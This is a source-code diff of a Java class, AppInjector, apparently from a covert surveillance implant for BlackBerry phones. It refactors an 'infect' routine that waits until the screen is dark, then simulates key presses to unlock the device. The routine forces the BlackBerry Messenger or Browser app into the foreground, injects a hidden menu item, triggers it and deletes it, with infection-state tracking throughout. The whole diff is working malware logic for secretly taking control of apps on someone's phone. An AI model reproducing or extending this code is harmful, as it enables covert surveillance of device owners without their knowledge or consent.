@@ -11,48 +11,37 @@ package blackberry.injection;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
-import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
-import blackberry.debug.Check;
+import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.module.im.AppInjectorBBM;
-import blackberry.module.url.AppInjectorBrowser;
+import blackberry.module.im.InjectMenuItem;
 import blackberry.utils.Utils;
 
-public class AppInjector {
+public abstract class AppInjector {
     public static final int APP_BBM = 1;
     public static final int APP_BROWSER = 2;
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjector", DebugLevel.VERBOSE);
     //#endif
 
-    private AppInjectorInterface delegate;
+    //private AppInjectorInterface delegate;
 
     ApplicationManager manager = ApplicationManager.getApplicationManager();
+    private Status status=Status.self();
+    private boolean infected;
+    private boolean infecting;
+    private Object infectingLock = new Object();
     public static final int KEY_LOCK = 4099;
 
-    public AppInjector(int app) throws Exception {
-        if (app == APP_BBM) {
-            //#ifdef DEBUG
-            debug.trace("AppInjector BBM");
-            //#endif
-            delegate = AppInjectorBBM.getInstance();
-        } else if (app == APP_BROWSER) {
-            //#ifdef DEBUG
-            debug.trace("AppInjector BROWSER");
-            //#endif
-            delegate = AppInjectorBrowser.getInstance();
-        } else {
-            //#ifdef DEBUG
-            debug.error("AppInjector, wrong value: " + app);
-            //#endif
-            throw new Exception();
-        }
-    }
+    protected abstract String getAppName();
+
+    protected abstract int getDelay();
+
+    protected abstract boolean actualCallMenuByKey();
 
     public boolean callMenuByKey() {
         //#ifdef DEBUG
@@ -70,9 +59,9 @@ public class AppInjector {
                 debug.trace("callMenuByKey foreground: " + apps[i].getName());
                 //#endif
 
-                if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
+                if (apps[i].getName().indexOf(getAppName()) >= 0) {
                     //MemoryCleanerDaemon.cleanAll();
-                    return delegate.callMenuByKey();
+                    return actualCallMenuByKey();
 
                 }
             }
@@ -80,46 +69,60 @@ public class AppInjector {
         return false;
     }
 
-    public boolean isInfected() {
-
-        boolean infected = delegate.isInfected();
+    public void callMenuInContext() {
         //#ifdef DEBUG
-        //debug.trace("isInfected: " + infected);
+
+        debug.trace("callMenuInContext"); //$NON-NLS-1$
         //#endif
+        menu.callMenuInContext();
+    }
+
+    public void setInfected(boolean value) {
+        infected = value;
+    }
+
+    public boolean isInfected() {
         return infected;
     }
 
-    public void callMenuInContext() {
+    protected InjectMenuItem menu;
+
+    public boolean injectMenu() {
         //#ifdef DEBUG
-        debug.trace("callInContext");
+        debug.trace("injectMenu"); //$NON-NLS-1$
         //#endif
-
-        //#ifdef DBC
-        Check.requires(delegate != null, "callMenuInContext: null delegate");
-        //#endif
-
-        if (delegate.isInfected()) {
-            delegate.callMenuInContext();
-        } else {
-            //#ifdef DEBUG
-            debug.error("callMenuInContext: not infected");
-            //#endif
-        }
+        menu.addMenuBBM();
+        return true;
     }
 
-    public synchronized void infect() {
+    public boolean deleteMenu() {
+        //#ifdef DEBUG
+        debug.trace("deleteMenu"); //$NON-NLS-1$
+        //#endif
+        menu.removeMenuBBM();
+        return true;
+    }
+
+    public void infect() {
         //#ifdef DEBUG
         debug.trace("infect");
         //#endif
 
-        if (backlight() || isInfected()) {
+        if (status.backlightEnabled() || isInfected() || isInfecting()) {
             //#ifdef DEBUG
             debug.trace("infected or backlight, bailing out");
             //#endif
             return;
         }
 
-        Utils.sleep(delegate.getDelay());
+        synchronized (infectingLock) {
+            infecting = true;
+        }
+
+        //#ifdef DEBUG
+        debug.trace("infect, wait " + getDelay() + " ms");
+        //#endif
+        Utils.sleep(getDelay());
 
         if (isInfected()) {
             //#ifdef DEBUG
@@ -135,12 +138,12 @@ public class AppInjector {
             return;
         }
 
-        setBacklight(false);
+        status.setBacklight(false);
 
         manager.requestForegroundForConsole();
         unLock();
 
-        if (backlight()) {
+        if (status.backlightEnabled()) {
             //#ifdef DEBUG
             debug.trace("infected: fail");
             //#endif
@@ -148,13 +151,13 @@ public class AppInjector {
         }
 
         int req = requestForeground();
-        Utils.sleep(200);
+        Utils.sleep(500);
         boolean fore = checkForeground();
 
         if (fore) {
             try {
                 Utils.sleep(200);
-                delegate.injectMenu();
+                injectMenu();
                 Utils.sleep(200);
                 if (!callMenuByKey()) {
                     //#ifdef DEBUG
@@ -167,7 +170,7 @@ public class AppInjector {
                 debug.error("infect: " + ex);
                 //#endif
             }
-            delegate.deleteMenu();
+            deleteMenu();
             Utils.sleep(200);
 
             //if (req == 2 && checkForeground()) {
@@ -181,6 +184,17 @@ public class AppInjector {
             debug.error("infect: failed to get foreground");
             //#endif
         }
+
+        synchronized (infectingLock) {
+            infecting = false;
+        }
+    }
+
+    private boolean isInfecting() {
+        synchronized (infectingLock) {
+            return infecting;
+        }
+
     }
 
     /**
@@ -191,15 +205,10 @@ public class AppInjector {
         debug.trace("unLock");
         //#endif
 
-        if (!backlight()){
-            //Main.getInstance().showBlackScreen(true);    
-            //Utils.sleep(1000);
-        }
-       
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
         Utils.sleep(200);
-        
-        if (backlight()) {
+
+        if (status.backlightEnabled()) {
             //#ifdef DEBUG
             debug.trace("Backlight still enabled, getHardwareLayout: "
                     + Keypad.getHardwareLayout());
@@ -209,10 +218,10 @@ public class AppInjector {
             Utils.sleep(200);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
             Utils.sleep(200);
-            setBacklight(false);
+            status.setBacklight(false);
             Utils.sleep(500);
             for (int i = 0; i < 10; i++) {
-                if (backlight()) {
+                if (status.backlightEnabled()) {
                     //Backlight.enable(false);
                     Utils.sleep(500);
                     //#ifdef DEBUG
@@ -225,36 +234,32 @@ public class AppInjector {
 
             return;
         }
-        
+
         //Main.getInstance().showBlackScreen(false); 
-    }
-
-    private boolean backlight() {
-        boolean ret = false;
-        ret = Backlight.isEnabled();
-        return ret;
-    }
-
-    private void setBacklight(boolean value) {
-        Backlight.enable(value);
     }
 
     private boolean checkForeground() {
         int foregroundPin = manager.getForegroundProcessId();
         ApplicationDescriptor[] apps = manager.getVisibleApplications();
         for (int i = 0; i < apps.length; i++) {
-            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
+            //#ifdef DEBUG
+            debug.trace("checkForeground: " + apps[i].getName());
+            //#endif
+            if (apps[i].getName().indexOf(getAppName()) >= 0) {
                 int processId = manager.getProcessId(apps[i]);
 
                 if (foregroundPin == processId) {
                     Screen screen = UiApplication.getUiApplication()
                             .getActiveScreen();
                     //#ifdef DEBUG
-                    debug.trace("checkForeground, found acrive screen: "
+                    debug.trace("checkForeground, found active screen: "
                             + screen);
                     //#endif
                     return true;
                 } else {
+                    //#ifdef DEBUG
+                    debug.trace("checkForeground, found but not foreground");
+                    //#endif
                     return false;
                 }
             }
@@ -265,8 +270,14 @@ public class AppInjector {
     private int requestForeground() {
         int foregroundPin = manager.getForegroundProcessId();
         ApplicationDescriptor[] apps = manager.getVisibleApplications();
+        //#ifdef DEBUG
+        debug.trace("requestForeground " + getAppName());
+        //#endif
         for (int i = 0; i < apps.length; i++) {
-            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
+            //#ifdef DEBUG
+            debug.trace("requestForeground, testing " + apps[i].getName());
+            //#endif
+            if (apps[i].getName().indexOf(getAppName()) >= 0) {
                 int processId = manager.getProcessId(apps[i]);
 
                 if (foregroundPin == processId) {
@@ -287,13 +298,10 @@ public class AppInjector {
         return 0;
     }
 
-    public void reset() {
-        delegate.reset();
-    }
-
     //#ifdef DEBUG
     public void disinfect() {
-        delegate.setInfected(false);
+        debug.warn("disinfect");
+        setInfected(false);
     }
     //#endif
 
